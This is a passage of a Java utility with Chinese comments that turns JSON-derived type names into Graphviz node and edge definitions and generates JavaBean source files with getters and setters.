			File copyResultFile = new File(resultDirFile.getAbsolutePath() + File.separator + resultFileName);
			fileCopy(resultFile, copyResultFile);
			System.out.println("生成文件[" + i + "] AllFile[" + rule17_resultFile_List.size() + "] = "
					+ copyResultFile.getAbsolutePath());
		}
		System.out.println("在 目录 " + resultDirFile.getAbsolutePath() + " 生成了解析的文件!");

	}

	public static String Rule17_execCMD(String command) {
		StringBuilder sb = new StringBuilder();
		try {
			Process process = Runtime.getRuntime().exec(command);
			BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(process.getInputStream()));
			String line;
			while ((line = bufferedReader.readLine()) != null) {
				sb.append(line + "\n");
			}
		} catch (Exception e) {
			return e.toString();
		}
		return sb.toString();
	}

	static class ProperityItem {
		String properityName;
		String TypeName;
		String ownnerClassName;
		String refClassName; // 当 isClassType = true 时 它所指向引用的那个 类名的名字

		String baseTypeInListName; // List<Double> 中的 基础类型数据的名称
		String classTypeInListName; // List<Class> 中的 类的 名称

		boolean isBaseType; // TypeName 是否基础数据类型 Array<String> 和 String 都是基础数据类型
		boolean isClassType; // 是否是 Class 引用数据类型
		boolean isObjectNullList; // 是否是 List<Object> 的 空的数组

		boolean isList; // 是否是集合 List<>
		boolean isBaseList; // 是否是基础的数据类型集合 List<String> List<Double>
		int baseListCount; // 该属性 包含 List的个数 嵌套数
		boolean isClassList; // 是否是对象的数据类型集合 List<A> List<B>
		int classListCount; // 该属性 包含 List的个数 嵌套数

		@Override
		public String toString() {
			return "【 ownnerClassName=" + ownnerClassName + "  properityName=" + properityName + " TypeName=" + TypeName
					+ " refClassName=" + refClassName + "  isBaseType=" + isBaseType + "  isClassType=" + isClassType
					+ "  isList=" + isList + " baseListCount=" + baseListCount + " classListCount=" + classListCount
					+ "  isObjectNullList " + isObjectNullList + "】";
		}

		ProperityItem(String ownnerClassName, String properityName, String TypeName, String refClassName) {
			if (ownnerClassName != null && !ownnerClassName.isEmpty()) {
				this.ownnerClassName = ownnerClassName;
			}
			if (properityName != null && !properityName.isEmpty()) {
				this.properityName = properityName;
			}
			if (TypeName != null && !TypeName.isEmpty()) {
				this.TypeName = TypeName;
			}
			if (refClassName != null && !refClassName.isEmpty()) {
				this.refClassName = refClassName;
			}

			if (TypeName != null && !TypeName.isEmpty()) {
				isBaseType = true;
				isClassType = false;
				if (TypeName.contains("String") || TypeName.contains("Double") || TypeName.contains("Integer")) {
					isBaseType = true;
					isClassType = false;
				} else {
					isClassType = true;
					isBaseType = false;
				}
			}

			if (TypeName != null && !TypeName.isEmpty()) {
				isList = false;
				isBaseList = false;
				isClassList = false;
				baseListCount = 0;
				classListCount = 0;
				if (TypeName.contains("List")) {
					isList = true;
					if (TypeName.contains("String")) {
						isBaseList = true;
						isClassList = false;
						baseTypeInListName = "String";
						baseListCount = StrUtil.count(TypeName, "List");
					} else if (TypeName.contains("Double")) {
						isBaseList = true;
						isClassList = false;
						baseTypeInListName = "Double";
						baseListCount = StrUtil.count(TypeName, "List");
					} else if (TypeName.contains("Integer")) {
						isBaseList = true;
						isClassList = false;
						baseTypeInListName = "Integer";
						baseListCount = StrUtil.count(TypeName, "List");
					} else if (TypeName.contains("Object")) { // 包含 Object的 空数组
						isClassList = true;
						isBaseList = false;
						isList = true;
						classListCount = StrUtil.count(TypeName, "List");
						isObjectNullList = true;
						classTypeInListName = "Object";
					} else { // List<List<List<SSSS>>>
						isBaseList = false;
						isClassList = true;
						classListCount = StrUtil.count(TypeName, "List");
						classTypeInListName = TypeName.replaceAll("List", "").replaceAll("<", "").replaceAll(">", "")
								.replaceAll(" ", "").trim();

					}
				}
			}
		}

		String getLable() {
			if (isClassType) {
				return StrUtil.upperFirst(properityName.trim());
			}
			return "\"" + properityName + "\\n" + "【" + TypeName + "】" + "\"";
		}

		// ArrayList<String> =List-String List【】 String【】 baseListCount == 1
		// ArrayList<String> baseListCount == 1 ArrayList<List<String>> baseListCount ==
		// 2
		ArrayList<String> getLableArr() {
			String item2 = "";
			ArrayList<String> stringArr = null;
			if (isList && isBaseType == true && baseListCount > 0) {

				stringArr = new ArrayList<String>();
				for (int i = 0; i < baseListCount; i++) {
					// stringArr.add("List"+"<【" + TypeName +"】>");

					stringArr.add("\"" + getBaseListShowString(properityName, TypeName, i) + "\"");
				}
				// baseTypeInListName String
				stringArr.add("\"" + properityName + "_item" + "\\n" + baseTypeInListName + "\"");

			} else if (isList && isClassType && isObjectNullList) { // 如果是空的列表的话 List<Object>
				stringArr = new ArrayList<String>();

				for (int i = 0; i < classListCount; i++) {
					String strItem = "\"" + getListShowString(properityName, TypeName, i) + "\"";
					// data\nList<【A___B___C】>
					stringArr.add(strItem);
					System.out.println(" properityName = " + properityName + "    TypeName=" + TypeName + "  index ="
							+ i + "strItem = " + strItem);

				}
				item2 = "\"" + classTypeInListName + "\\n" + properityName + "\"";
				stringArr.add(item2); // A 类名 \\n 属性名

			} else if (isList && isClassType == true && classListCount > 0) { // 如果是 List 列表的话
				// // 获取 数组的 data 【List<A>】 properityName=data TypeName=List<A>
				// List<【List<A>】> data List<>
				stringArr = new ArrayList<String>();

				for (int i = 0; i < classListCount; i++) {
					String strItem = "\"" + getListShowString(properityName, TypeName, i) + "\"";
					// data\nList<【A___B___C】>\nA[1][2][3][4][5][6][7][8][10][11][12][13][14][15][16][17][18]\nB[9][19]\nC[0]
					// tempstr=A___B___C
					stringArr.add(strItem);
					System.out.println(" properityName = " + properityName + "    TypeName=" + TypeName + "  index ="
							+ i + "strItem = " + strItem);
					// properityName = data
					// TypeName=List<A___B___C>\nA[1][2][3][4][5][6][7][8][10][11][12][13][14][15][16][17][18]\nB[9][19]\nC[0]
					// index =0
					// strItem =
					// "data\nList<A___B___C\nA[1][2][3][4][5][6][7][8][10][11][12][13][14][15][16][17][18]\nB[9][19]\nC[0]>"
				}
				item2 = "\"" + classTypeInListName + "\\n" + properityName + "\"";
				stringArr.add(item2); // A 类名 \\n 属性名
			}

			System.out.println("classTypeInListName = " + classTypeInListName + " properityName" + properityName);
			System.out.println("item2 = " + item2 + " stringArr.size()" + stringArr.size()); // stringArr.size() =2

			// classTypeInListName =
			// A___B___C\nA[1][2][3][4][5][6][7][8][10][11][12][13][14][15][16][17][18]\nB[9][19]\nC[0]
			// properityName = data
			// item1 =
			// data\nList<【A___B___C】>\nA[1][2][3][4][5][6][7][8][10][11][12][13][14][15][16][17][18]\nB[9][19]\nC[0]
			// tempstr=A___B___C
			// item2 =
			// A___B___C\nA[1][2][3][4][5][6][7][8][10][11][12][13][14][15][16][17][18]\nB[9][19]\nC[0]\ndata
			return stringArr;
		}

		String getBaseListShowString(String properityName, String strListTypeName, int index) {
			int count = StrUtil.count(strListTypeName, "List");
			if (count == 1 || index == 0) {
				return properityName + "\\n" + getPretyTypeName(TypeName, baseTypeInListName, 0);
				// data\nList<【A___B___C】>\nA[1][2][3][4][5][6][7][8][10][11][12][13][14][15][16][17][18]\nB[9][19]\nC[0]
				// tempstr=A___B___C
			} else {
				return getPretyTypeName(TypeName, baseTypeInListName, index);
			}
			// properityName=data TypeName=List<A> classTypeInListName=A
//List<List<List<String>>>   data    【 count 是总的List的个数】   【index =0 】 是显示的个数 显示的个数是 count - index
// 【count 3 , index 0】  data \n List<【List<List<A>>】>
// 【count 3 , index 1】  List<【<List<A>】>
// 【count 3 , index 2】  List<【A】>

		}

		String getListShowString(String properityName, String strListTypeName, int index) {

			// properityName = data
			// TypeName=List<A___B___C>\nA[1][2][3][4][5][6][7][8][10][11][12][13][14][15][16][17][18]\nB[9][19]\nC[0]
			// index =0
			// strItem =
			// "data\nList<A___B___C\nA[1][2][3][4][5][6][7][8][10][11][12][13][14][15][16][17][18]\nB[9][19]\nC[0]>"

			int count = StrUtil.count(strListTypeName, "List");
			if (count == 1 || index == 0) { // 如果只包含一个List
				// strItem =
				// "data\nList<A___B___C\nA[1][2][3][4][5][6][7][8][10][11][12][13][14][15][16][17][18]\nB[9][19]\nC[0]>"
				String curItem = properityName + "\\n" + getPretyTypeName(TypeName, classTypeInListName, 0);
				// data\nList<【A___B___C】>\nA[1][2][3][4][5][6][7][8][10][11][12][13][14][15][16][17][18]\nB[9][19]\nC[0]
				// tempstr=A___B___C
				return curItem;
			} else {
				return getPretyTypeName(TypeName, classTypeInListName, index);
			}
			// properityName=data TypeName=List<A> classTypeInListName=A
//List<List<List<A>>>   data    【 count 是总的List的个数】   【index =0 】 是显示的个数 显示的个数是 count - index
// 【count 3 , index 0】  data \n List<【List<List<A>>】>
// 【count 3 , index 1】  List<【<List<A>】>
// 【count 3 , index 2】  List<【A】>

		}

		String getPretyTypeName(String strListTypeName, String classTypeInListName, int index) {

			// properityName = data
			// TypeName=List<A___B___C>\nA[1][2][3][4][5][6][7][8][10][11][12][13][14][15][16][17][18]\nB[9][19]\nC[0]
			// index =0
			// strItem =
			// "data\nList<A___B___C\nA[1][2][3][4][5][6][7][8][10][11][12][13][14][15][16][17][18]\nB[9][19]\nC[0]>"
			// classTypeInListName
			// zclassTypeInListName
			// =A___B___C\nA[1][2][3][4][5][6][7][8][10][11][12][13][14][15][16][17][18]\nB[9][19]\nC[0]

			System.out.println("zclassTypeInListName  =" + classTypeInListName);
			int count = StrUtil.count(strListTypeName, "List");
			if (index > count) {
				System.out.println("getPretyTypeName 索引错误  index=" + index + "   count =" + count);
			}
// 【count 3 , index 0  keepListCount=3 】  data \n List<【List<List<A>>】>
// 【count 3 , index 1  keepListCount=2 】  List<【<List<A>】>
// 【count 3 , index 2 keepListCount=1 】  List<【A】>

			// List<A___B___C\nA[1][2][3][4][5][6][7][8][10][11][12][13][14][15][16][17][18]\nB[9][19]\nC[0]>"
			int keepListCount = count - index;
			String fixClassTypeInListName = new String(classTypeInListName);
//    // List<A___B___C>\nA[1][2][3][4][5][6][7][8][10][11][12][13][14][15][16][17][18]\nB[9][19]\nC[0]
			String listString = buildListString(fixClassTypeInListName, keepListCount); // List<A> List<List<List<A>>>
			System.out.println("zlistString " + listString);
			String tempstr = "";
			String resultStr = "";
			if (listString.contains("\\n") && listString.contains("___")) {
				tempstr = classTypeInListName.substring(0, classTypeInListName.indexOf("\\n"));
				resultStr = listString.replaceAll(tempstr, "【" + tempstr + "】"); // List<【A】> List<List<List<【A】>>>
			} else {

				resultStr = listString.replaceAll(classTypeInListName, "【" + classTypeInListName + "】"); // List<【A】>
				// List<List<List<【A】>>>
			}

			// resultStr
			// List<【A___B___C】>\nA[1][2][3][4][5][6][7][8][10][11][12][13][14][15][16][17][18]\nB[9][19]\nC[0]
			// tempstr=A___B___C
			System.out.println("resultStr " + resultStr + "  tempstr=" + tempstr);
			return resultStr;
		}

		String buildListString(String classTypeInListName, int listCount) {
			// List<A___B___C\nA[1][2][3][4][5][6][7][8][10][11][12][13][14][15][16][17][18]\nB[9][19]\nC[0]>"

			// classTypeInListName
			// =A___B___C\nA[1][2][3][4][5][6][7][8][10][11][12][13][14][15][16][17][18]\nB[9][19]\nC[0]
			// classTypeInListNameX E
			String arrEnd = "";
			String listNameWithoutN = "";
			if (classTypeInListName.contains("\\n")) {
				arrEnd = classTypeInListName.substring(classTypeInListName.indexOf("\\n"),
						classTypeInListName.length());
				listNameWithoutN = classTypeInListName.substring(0, classTypeInListName.indexOf("\\n"));
			}
			System.out.println("classTypeInListNameX " + classTypeInListName);
			String curStr = "";
			String curStrKeep = "";
			for (int i = 0; i < listCount; i++) {
				if (i == 0) {
					curStr = "List<" + (listNameWithoutN.isEmpty() ? classTypeInListName : listNameWithoutN) + ">"
							+ curStrKeep;
					curStrKeep = curStr;
				} else {
					curStr = "List<" + curStrKeep + ">";
					curStrKeep = curStr;
				}
			}
// 【index 1  List<A>】
// 【index 2  List<List<A>>】
// 【index 3  List<List<List<A>>>】
			String result = curStrKeep + arrEnd;
			// List<A___B___C>\nA[1][2][3][4][5][6][7][8][10][11][12][13][14][15][16][17][18]\nB[9][19]\nC[0]

			// zlistString List<>
			System.out.println("result " + result);
			return result;
		}

		ArrayList<String> getShapeArr() {

//            boolean isBaseType;       //  TypeName 是否基础数据类型 Array<String>  和 String  都是基础数据类型
////            boolean isClassType;        //  是否是 Class 引用数据类型
////            boolean isList;       //  是否是集合   List<>
////            boolean isBaseList;   // 是否是基础的数据类型集合  List<String>   List<Double>
////            boolean isClassList;   // 是否是对象的数据类型集合  List<A>   List<B>
// box【普通数据类型的数据】   doubleoctagon【普通数据类型的数组】     circle【 Class 引用 】     doublecircle 【List<Class 引用>】
//            if(isBaseType == true && isList == false){
//                return "box";
//            } else if(isBaseType == true && isList == true){
//                return "doubleoctagon";
//            }else if(isBaseType == false && isList == false){
//                return "circle";
//            }else if(isBaseType == false && isList == true){
//                return "doublecircle";
//            }
//            return "";
			ArrayList<String> stringArr = null;
			if (isList && isBaseType == true && baseListCount > 0) {

				stringArr = new ArrayList<String>();
				for (int i = 0; i < baseListCount; i++) {
					stringArr.add("shape=doubleoctagon");
				}
				stringArr.add("shape=box");
			} else if (isList && isClassType && isObjectNullList) {
				for (int i = 0; i < classListCount; i++) {
					stringArr.add("shape=doubleoctagon");
				}

			} else if (isList && isClassType == true && classListCount > 0) {
				stringArr = new ArrayList<String>();
				for (int i = 0; i < classListCount; i++) {
					stringArr.add("shape=doubleoctagon");
				}
				stringArr.add("shape=circle");
			}
			return stringArr;
		}

		String getShape() {

//            boolean isBaseType;       //  TypeName 是否基础数据类型 Array<String>  和 String  都是基础数据类型
////            boolean isClassType;        //  是否是 Class 引用数据类型
////            boolean isList;       //  是否是集合   List<>
////            boolean isBaseList;   // 是否是基础的数据类型集合  List<String>   List<Double>
////            boolean isClassList;   // 是否是对象的数据类型集合  List<A>   List<B>
// box【普通数据类型的数据】   doubleoctagon【普通数据类型的数组】     circle【 Class 引用 】     doublecircle 【List<Class 引用>】
			if (isBaseType == true && isList == false) {
				return "shape=box";
			} else if (isBaseType == true && isList == true) {
				return "shape=doubleoctagon";
			} else if (isBaseType == false && isList == false) {
				return "shape=circle";
			} else if (isBaseType == false && isList == true && !isObjectNullList) {
				return "shape=doublecircle";
			} else if (isBaseType == false && isList == true && isObjectNullList) {
				return "shape=doubleoctagon";
			}
			return "";
		}

		String getStyle() {
// box【普通数据类型的数据】   doubleoctagon【普通数据类型的数组】     circle【 Class 引用 】     doublecircle 【List<Class 引用>】
			if (isBaseType == true && isList == false) {
				return ""; // 基础数据类型没有颜色
			} else if (isBaseType == true && isList == true) {
				return ""; // 基础数据类型没有颜色
			} else if (isBaseType == false && isList == false) {
				return "style=filled"; // 单个 Class的 颜色是 红色
			} else if (isBaseType == false && isList == true) {
				return "style=filled"; // 多个 List<Class> 是 黄色
			}
			return "";
		}

		ArrayList<String> getStyleArr() {
// box【普通数据类型的数据】   doubleoctagon【普通数据类型的数组】     circle【 Class 引用 】     doublecircle 【List<Class 引用>】
			ArrayList<String> stringArr = null;
			if (isList && isBaseType == true && baseListCount > 0) { // 基础类型数据集合

				stringArr = new ArrayList<String>();
				for (int i = 0; i < baseListCount; i++) {
					stringArr.add("");
				}
				stringArr.add("");
			} else if (isList && isClassType == true && classListCount > 0) { // 对象类型颜色
				stringArr = new ArrayList<String>();
				for (int i = 0; i < classListCount; i++) {
					stringArr.add("style=filled");
				}
				stringArr.add("style=filled");
			}
			return stringArr;

		}

		ArrayList<String> getColorArr() {
//// box【普通数据类型的数据】   doubleoctagon【普通数据类型的数组】     circle【 Class 引用 】     doublecircle 【List<Class 引用>】
//            // box【普通数据类型的数据】   doubleoctagon【普通数据类型的数组】     circle【 Class 引用 】     doublecircle 【List<Class 引用>】
//            if(isBaseType == true && isList == false){
//                return "";   // 基础数据类型没有颜色
//            } else if(isBaseType == true && isList == true){
//                return "";  // 基础数据类型没有颜色
//            }else if(isBaseType == false && isList == false){
//                return "red";   // 单个 Class的 颜色是 红色
//            }else if(isBaseType == false && isList == true){
//                return "yellow";  // 多个 List<Class> 是 黄色
//            }
//            return "";

			ArrayList<String> stringArr = null;
			if (isList && isBaseType == true && baseListCount > 0) { // 基础类型数据集合

				stringArr = new ArrayList<String>();
				for (int i = 0; i < baseListCount; i++) {
					stringArr.add("");
				}
				stringArr.add("");
			} else if (isList && isClassType && isObjectNullList) {
				for (int i = 0; i < classListCount; i++) {
					stringArr.add("color=purple");
				}

			} else if (isList && isClassType == true && classListCount > 0) { // 对象类型颜色
				stringArr = new ArrayList<String>();
				for (int i = 0; i < classListCount; i++) {
					stringArr.add("color=yellow");
				}
				stringArr.add("color=red");
			}
			return stringArr;

		}

		String getColor() {
// box【普通数据类型的数据】   doubleoctagon【普通数据类型的数组】     circle【 Class 引用 】     doublecircle 【List<Class 引用>】
			// box【普通数据类型的数据】 doubleoctagon【普通数据类型的数组】 circle【 Class 引用 】 doublecircle
			// 【List<Class 引用>】
			if (isBaseType == true && isList == false) {
				return ""; // 基础数据类型没有颜色
			} else if (isBaseType == true && isList == true) {
				return ""; // 基础数据类型没有颜色
			} else if (isBaseType == false && isList == false) {
				return "color=red"; // 单个 Class的 颜色是 红色
			} else if (isBaseType == false && isList == true && isObjectNullList) {
				return "color=purple"; // 多个 json为[] 的 对象的 颜色是蓝色的
			} else if (isBaseType == false && isList == true) {
				return "color=yellow"; // 多个 List<Class> 是 黄色
			}
			return "";
		}

		String getNodeName() {
			if (TypeName.equals("Class")) {
				return properityName;
			}
			String nodeName = ownnerClassName + "_" + properityName;
			while (nodeName.startsWith("_")) {
				nodeName = nodeName.substring(1, nodeName.length());
			}
			while (nodeName.endsWith("_")) {
				nodeName = nodeName.substring(0, nodeName.length() - 1);
			}

			// nodeName.get(0)=View_font-size-editor 在 .gv 文件中 不能以 - 命名变量

			nodeName = fixedName_Json2Bean(nodeName);
			return nodeName;
		}

		ArrayList<String> getNodeNameArr() {
			ArrayList<String> stringArr = null;
			if (isList && isBaseType == true && baseListCount > 0) {

				stringArr = new ArrayList<String>();
				for (int i = 0; i < baseListCount; i++) {
					stringArr.add(ownnerClassName + "_" + properityName + "_Arr" + i);
				}
				// stringArr.add(ownnerClassName + "_" + properityName + "_ArrEnd" + "_" +
				// baseTypeInListName);
				stringArr.add(ownnerClassName + "_" + properityName + "_ArrEnd" + "_" + baseTypeInListName);
			} else if (isList && isClassType == true && isObjectNullList) {
				stringArr = new ArrayList<String>();
				stringArr.add(ownnerClassName + "_" + properityName);
			} else if (isList && isClassType == true && classListCount > 0 && !isObjectNullList) {
				stringArr = new ArrayList<String>();
				for (int i = 0; i < classListCount; i++) {
					stringArr.add(ownnerClassName + "_" + properityName + "_Arr" + i);
				}
				// 类名在处理的时候 使用 类自己的名字
				stringArr.add(classTypeInListName);
			}
			return stringArr;
		}

		String getRefNodeName() { //

			return refClassName;
		}

		String makeNodeString() { //
			if (isBaseType == true && isList == false) {
				// RootBean_doubleList_Double [label="Double" shape=box] 单独的 基础类型变量
				return getNodeName() + " [label=" + getLable() + " " + getShape() + " ]";
			} else if (isBaseType == true && isList == true) {
				// RootBean_multyList_List [label="RootBean_multyList_List" shape=doubleoctagon]
				// 基础类型变量 集合
				ArrayList<String> nodeArr = getNodeNameArr();
				ArrayList<String> labelArr = getLableArr();
				ArrayList<String> colorArr = getColorArr();
				ArrayList<String> shapeArr = getShapeArr();
				ArrayList<String> styleArr = getStyleArr();

				String item = "";
				StringBuilder sb = new StringBuilder();
				int length = nodeArr.size();
				for (int i = 0; i < length; i++) {
					item = nodeArr.get(i).trim() + "[ label=" + labelArr.get(i).trim() + "  " + shapeArr.get(i).trim()
							+ " " + styleArr.get(i).trim() + " " + colorArr.get(i) + "] \n ";
					sb.append(item);
				}
				return sb.toString();
			} else if (isClassType == true && isList == false && isClassList == false && TypeName.equals("Class")) {
				// RootBean_Data [label="RootBean_Data" shape=circle style=filled color=red]
				// 单独的类 引用的变量
				return getNodeName() + " [label=" + getLable() + " " + getShape() + " " + getStyle() + " " + getColor()
						+ " ]";

			} else if (isClassType == true && isList == true && isClassList == true && isObjectNullList) {

				System.out.println("Test Here this.toString =" + this.toString());
				// 【 ownnerClassName=null properityName=image_list TypeName=List<Object>
				// refClassName=null isBaseType=false isClassType=true isList=true
				// baseListCount=0 classListCount=1 isObjectNullList true】
// 【 ownnerClassName=Highlight  properityName=title TypeName=List<Object> refClassName=null  isBaseType=false  isClassType=true  isList=true baseListCount=0 classListCount=1  isObjectNullList true】

				String returnNode = getNodeName() + " [label=" + getLable() + " " + getShape() + " " + getStyle() + " "
						+ getColor() + " ]";
				System.out.println("returnNodeX =" + returnNode);
				// B_source [label=Source shape=doublecircle style=filled color=blue ]
				// 【 ownnerClassName=B properityName=source TypeName=List<Object>
				// refClassName=null
				return returnNode;

			} else if (isClassType == true && isList == true && isClassList == true && !isObjectNullList) {
				// RootBean_Data_Item [label="RootBean_Data_Item" shape=doublecircle
				// style=filled color=yellow]
				ArrayList<String> nodeArr = getNodeNameArr();
				ArrayList<String> labelArr = getLableArr();
				ArrayList<String> colorArr = getColorArr();
				ArrayList<String> shapeArr = getShapeArr();
				ArrayList<String> styleArr = getStyleArr();

				String item = "";
				StringBuilder sb = new StringBuilder();
				int length = nodeArr.size();
				for (int i = 0; i < length - 1; i++) {
					// 最后一个是类 Class 属性的话 那么 就 不再创建 Node
					String labelItem = labelArr.get(i).trim(); // 这里不正常
					System.out.println(" labelItemepre = " + labelItem);
					System.out.println(" labelItemeback = " + labelItem);
					// item1 =
					// data\nList<【A___B___C】>\nA[1][2][3][4][5][6][7][8][10][11][12][13][14][15][16][17][18]\nB[9][19]\nC[0]
					// tempstr=A___B___C
					// item2 =
					// A___B___C\nA[1][2][3][4][5][6][7][8][10][11][12][13][14][15][16][17][18]\nB[9][19]\nC[0]\ndata
					item = nodeArr.get(i).trim() + "[ label=" + labelItem.trim() + "  " + shapeArr.get(i).trim() + "  "
							+ styleArr.get(i).trim() + " " + colorArr.get(i) + "] \n ";
					sb.append(item);
				}
				return sb.toString();

			}

			return "";
		}

		String getWeight() {
			if (TypeName.equals("Class")) {
				return "[weight= 30]";
			}
			if (isClassType == true && isList == true && isClassList == true) {

				return "[weight= 50]";
			}

			if (isClassType == true && isList == false && isClassList == false) {

				return "[weight= 20 ]";
			}

			if (isBaseType == true && isList == true) {

				return "[weight= 5]";
			} else {

				return "[weight= 1 ]";
			}
		}

		String makeNodeRelationString() { //

			if (isBaseType == true && isList == false) {
				// 单独的 基础类型变量 关系 RootBean -> RootBean_code
				if (ownnerClassName != null && !ownnerClassName.trim().isEmpty()) {
					System.out.println(
							"make-> 7  ownnerClassName=" + getNodeName() + "    nodeName.get(0)=" + getNodeName());
					return ownnerClassName + " -> " + getNodeName() + " " + getWeight();
				}

			} else if (isBaseType == true && isList == true) {
//                RootBean -> RootBean_multyList
//                RootBean_multyList -> RootBean_multyList_List
//                RootBean_multyList_List -> RootBean_multyList_List_List
//                RootBean_multyList_List_List -> RootBean_multyList_List_List_Item

				if (ownnerClassName != null && !ownnerClassName.trim().isEmpty()) {

					ArrayList<String> nodeName = getNodeNameArr();
					int length = getNodeNameArr().size();
					String item1 = "";
					String item2 = "";
					StringBuilder sb = new StringBuilder();
					if (length > 0) {
						System.out.println("make-> 6  ownnerClassName=" + ownnerClassName + "    nodeName.get(0)="
								+ nodeName.get(0));
						sb.append(ownnerClassName + " -> " + nodeName.get(0) + " " + getWeight() + "\n");
						for (int i = 1; i < length; i++) {
							item1 = nodeName.get(i - 1);
							item2 = nodeName.get(i);
							System.out.println("make-> 5  item1=" + item1 + "    item2=" + item2);
							sb.append(item1 + " -> " + item2 + " " + getWeight() + "\n");
						}
					}

					return sb.toString();
				}
			} else if (isClassType == true && isList == false && isClassList == false && refClassName != null) {
//   对于单独的 Class  它的 关系 已经 通过 属性 来设置了   所以 这里不用设置关系

				System.out.println("make-> 4  refClassName=" + refClassName + "    properityName=" + properityName);
				return refClassName + " -> " + properityName + " " + getWeight();

//   refClassName=B   这里替换为   ownnerClassName 错误   寻找 new Preperty的地方
				// ClassName = 【Extra】 index =【6 】 subIndex=【0】 str=【 ownnerClassName=Extra
				// properityName=topic TypeName=Topic refClassName=B isBaseType=false
				// isClassType=true isList=false baseListCount=0 classListCount=0】
// make-> 4  refClassName=Extra    properityName=Topic_2048
// make-> 4  refClassName=Extra    properityName=Topic
// make-> 4  refClassName=B    properityName=topic
// make-> 4  refClassName=B    properityName=topic_2048
			} else if (isClassType == true && isList == true && isClassList == true && isObjectNullList) {

				System.out.println("make->x   refClassName=" + refClassName + "    properityName=" + properityName
						+ " this.toString=" + this.toString());

				// make->x refClassName=null properityName=image_detail this.toString=【
				// ownnerClassName=B properityName=image_detail TypeName=List<Object>
				// refClassName=null isBaseType=false isClassType=true isList=true
				// baseListCount=0 classListCount=1 isObjectNullList true】

// returnNodeX =Highlight_source [label=Source shape=doublecircle style=filled color=blue ]
				ArrayList<String> arr = getNodeNameArr();
				for (String nullArrStr : arr) {
					System.out.println("nullArrStr = " + nullArrStr);
				}
				String nullRela = ownnerClassName + " -> " + arr.get(0) + " " + getWeight();
				System.out.println("nullRela = " + nullRela);

				// Line 39: Highlight_source [label=Source shape=doublecircle style=filled
				// color=blue ]
				// Line 43: Highlight -> Highlight_source_Arr0 [weight= 50]

				return nullRela;

			} else if (isClassType == true && isList == true && isClassList == true && !isObjectNullList) {
//  对象数组 列表       RootBean.java 的   List<A> data;
//  RootBean -> RootBean_Data  [weight=10]
//  RootBean_Data  -> RootBean_Data_Count

				ArrayList<String> nodeName = getNodeNameArr();
				// makeNodeRelationString = [RootBean_data_Arr0, A___B___C]
				System.out.println("makeNodeRelationString = " + nodeName); // zzj
				int length = getNodeNameArr().size();
				String item1 = "";
				String item2 = "";
				StringBuilder sb = new StringBuilder();
				if (length > 0) {
					System.out.println(
							"make-> 3  ownnerClassName=" + ownnerClassName + "    nodeName.get(0)=" + nodeName.get(0));
					sb.append(ownnerClassName + " -> " + nodeName.get(0) + " " + getWeight() + "\n");
					for (int i = 1; i < length; i++) {
						item1 = nodeName.get(i - 1);
						item2 = nodeName.get(i);
						if (!item2.contains("___")) {
							System.out.println("make-> 2  item1=" + item1 + "    item2=" + item2);
							sb.append(item1 + " -> " + item2 + " " + getWeight() + "\n");
						} else {
							String[] subArr = item2.split("___");
							int lengthSub = subArr.length;
//make-> 1 item1=RootBean_data_Arr0    subArr[x]=A
//make-> 1 item1=RootBean_data_Arr0    subArr[x]=B
// make-> 1 item1=RootBean_data_Arr0    subArr[x]=C\nA[1][2][3][4][5][6][7][8][10][11][12][13][14][15][16][17][18]\nB[9][19]\nC[0]
							for (int x = 0; x < lengthSub; x++) {

								String itemStr = new String(subArr[x]);
								System.out.println("make-> 1 item1=" + item1 + "    subArr[x]pre=" + itemStr);
								if (itemStr.trim().contains("\\n")) {
									itemStr = itemStr.substring(0, itemStr.indexOf("\\n"));
								}
								System.out.println("make-> 1 item1=" + item1 + "    subArr[x]back=" + itemStr);
								sb.append(item1 + " -> " + itemStr + " " + getWeight() + "\n");
							}
						}

					}
				}
				return sb.toString();
			}
			return "";
		}

	}

	public interface BeanGenerator {

		/**
		 * @param className 类名
		 * @param map       字段及类型
		 * @throws IOException
		 */
		void writeBean(String className, Map<String, Object> map) throws IOException;

		/**
		 * @param list List<....>
		 * @throws IOException
		 */
		void writeList(String list) throws IOException;
	}

	public class CamelCaseBeanGenerator extends MyBeanGenerator {

		public CamelCaseBeanGenerator(String packName) {
			super(packName);
		}

		@Override
		public void writeBean(String className, Map<String, Object> map) throws IOException {
			System.out.println(" className1   = " + className); // 找到对应的 Class 中的类 没有执行该类
			File file = new File("src/" + packName.replace(".", "/"));
			if (!file.exists() || file.exists() && file.isFile()) {
				file.mkdirs();
			}

			System.out.println(" className2  =  rule17_resultFile_List.add(javaFile) " + className);
			File javaFile = new File(file, className + ".java");

			rule17_resultFile_List.add(javaFile);

			BufferedWriter bw = new BufferedWriter(new FileWriter(javaFile));
			bw.write("package ");
			bw.write(packName);
			bw.write(";\n");
			bw.write("import java.util.List;\n\n");

			bw.write("/**\n");
			bw.write(" *auto generate\n");
			bw.write(" *\n");
			bw.write(" *@author Zukgit\n");
			bw.write(" *\n");
			bw.write(" */\n");

			bw.write("public class ");
			bw.write(className);
			bw.write("{\n");

			map = sortMapByKey(map);
			Set<Map.Entry<String, Object>> set = map.entrySet();

			for (Map.Entry<String, Object> entry : set) {
				bw.write("    ");
				bw.write(entry.getValue().toString());
				bw.write(" ");
				bw.write(formatReference(entry.getKey()));
				bw.write(";\n");
			}
			bw.write("\n");
			set = map.entrySet();

			for (Map.Entry<String, Object> entry : set) {

				bw.write("    public ");
				bw.write(entry.getValue().toString());
				bw.write(" get");
				bw.write(capitalUpper(entry.getKey()));
				bw.write("(){\n");
				bw.write("        ");
				bw.write("return ");
				bw.write(formatReference(entry.getKey()));

				bw.write(";\n    }\n\n");

				//////////////////////////

				bw.write("    public void ");
				bw.write("set");
				bw.write(capitalUpper(entry.getKey()));
				bw.write("(");
				bw.write(entry.getValue().toString());
				bw.write(" ");
				bw.write(formatReference(entry.getKey()));
				bw.write("){\n");
				bw.write("        ");
				bw.write("this.");
				bw.write(formatReference(entry.getKey()));
				bw.write("=");
				bw.write(formatReference(entry.getKey()));
				bw.write(";\n    }\n");

				bw.write("\n");

			}
			bw.write("}");

			bw.close();

		}

		public Map<String, Object> sortMapByKey(Map<String, Object> oriMap) {

			Map<String, Object> sortedMap = new TreeMap<String, Object>(new Comparator<String>() {
				public int compare(String key1, String key2) {

					return key1.compareTo(key2);
				}
			});
			sortedMap.putAll(oriMap);
			return sortedMap;
		}

		private String capitalUpper(String getset) {
			String s = formatReference(getset);
			char[] chs = s.toCharArray();
			if (chs[0] > 'a' && chs[0] < 'z') {
				chs[0] = (char) (chs[0] - 32);
			}

			return new String(chs);

		}

		private String formatReference(String ref) {

			char[] chs = ref.toCharArray();
